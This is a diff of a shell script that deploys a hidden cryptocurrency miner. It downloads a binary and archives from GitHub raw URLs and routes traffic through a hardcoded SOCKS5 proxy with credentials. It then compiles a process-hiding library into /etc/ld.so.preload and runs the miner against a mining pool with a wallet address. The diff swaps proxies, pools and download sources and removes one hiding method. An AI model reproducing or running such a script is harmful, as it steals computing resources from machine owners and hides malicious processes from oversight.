@@ -1,28 +1,19 @@
 #!/bin/sh
-ln -fs /usr/share/zoneinfo/Asia/Bangkok /etc/localtime
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-apt-get install -y nodejs
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
 
-npm i -g node-process-hider
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
-sudo ph add blckdscard
-
-apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl -y
-
-sudo ph add graftcp 
-
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz >/dev/null 2>&1
-
-tar -xvzf graphics.tar.gz >/dev/null 2>&1
+tar -xvzf graphics.tar.gz
 
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 176.53.133.217:57597
-socks5_username = 2BHVpyGPD
-socks5_password = 1rN14HAmV
+socks5 =  185.9.52.173:5181
+socks5_username = lebarankita
+socks5_password = buatTHRan
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -44,16 +35,13 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash >/dev/null 2>&1
-chmod +x bezzHash >/dev/null 2>&1
+./graftcp/graftcp wget https://raw.githubusercontent.com/githuboneheart/-/main/views/bezzHash
+chmod +x bezzHash
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip >/dev/null 2>&1
-unzip -o magicBezzHash.zip
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-sudo ph add bezzHash
-
-./graftcp/graftcp ./bezzHash --url=sanninmode.ETH@ethash.kupool.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --algo ETHASH --pool eth.2miners.com:2020 --user 12kAWQNEWUD4c8LzNB9VhRFVYZZBXQSvLy.Berkah
